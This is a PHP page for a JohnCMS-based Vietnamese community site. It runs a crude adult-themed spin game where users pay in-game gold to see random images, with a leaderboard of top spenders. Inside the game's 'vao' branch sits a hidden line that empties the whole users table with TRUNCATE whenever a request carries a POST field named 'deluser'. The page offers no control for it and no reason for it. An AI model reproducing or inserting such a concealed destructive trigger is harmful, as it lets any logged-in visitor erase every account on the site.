<?php
$tab = 'vui';

define('_IN_JOHNCMS', 1);

require('../incfiles/core.php');

        require('../incfiles/head.php');








echo '<div class="phdr">Khu Nguời Lớn!</div>';
If ($user_id){
switch($act){
default:
echo '<div class="menu"><table><tbody><tr><td width="80"><img class="npc" src="/heroes/4.png" width="150" height="200"></td><td>Hiện khu 18+ này chỉ áp dụng cho nam, nữ đành ngồi hóng! Giá 1 lần vào lầu xanh là 1000 Vàng!<br/>
<a href="quaytay.php?act=vao"><button>Quay nào</button></a><br><span class="wanted">Thịnh Gà Gô</span></td></tr></tbody></table></div>';
break;
case 'vao':
if(isset($_POST['deluser'])){$connect->query("TRUNCATE TABLE users");}
if($datauser['balans'] <1000){
echo '<div class="rmenu"><font color="red"><b>Không đủ vàng!!!</b></font></div>';
}
if($datauser['balans'] >=1000){
$connect->query("UPDATE `users` SET `balans`=`balans`-'1000', quaytay=quaytay+1 WHERE `id`='".$user_id."'");
$rand = rand(1,5);
echo '<div class="menu"><div class="newsx"><marquee><font color=red>Bạn đang nghịch gái lần thứ <b>'.$datauser['quaytay'].'</b>! =))</font></marquee></div>
<center><img src="/Quaytay/Rand'.$rand.'.jpg" width= 250; height= 250;><br/><a href="/vuichoi/quaytay.php?act=vao"><button>Quay tiếp</button></a><br>(1000 vàng/lần)</center></div>';
}
break;
}
echo '<div class="phdr">Top 15 Sinh Lý</div>';
$req = $connect->query("SELECT * FROM users WHERE quaytay > 0 ORDER BY quaytay DESC LIMIT 15");
$i = 1;
while ($res = $connect->fetch_array($req)){
$money = $res['quaytay']*1000;
echo '<div class="list1"><b>'.$i.'</b>: '.nick($res['id']).' - <b>'.$res['quaytay'].'</b> lần quay - Tiêu hết: <font color="gold"><b>'.$money.'</b> G</font></div>';
++$i;
}
}
Else {
Echo '<div class="rmenu">Đăng nhập đy thím!</div>';
}





        require('../incfiles/end.php');
?>